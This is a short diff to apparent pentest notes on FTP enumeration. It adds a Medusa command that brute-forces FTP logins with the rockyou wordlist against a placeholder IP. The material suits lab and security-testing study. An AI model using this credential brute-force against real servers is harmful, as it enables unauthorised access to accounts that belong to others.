@@ -1,2 +1,6 @@
 ftp username@<IP address> :- Connect to the FTP server
 ftp> ls -R :- Will list all the files in the server (recursive list) 
+
+
+We can bruteforce the credentials with the help of Medusa 
+  # medusa -u <username> -P /usr/share/wordlists/rockyou.txt -h <IP address> -M ftp 
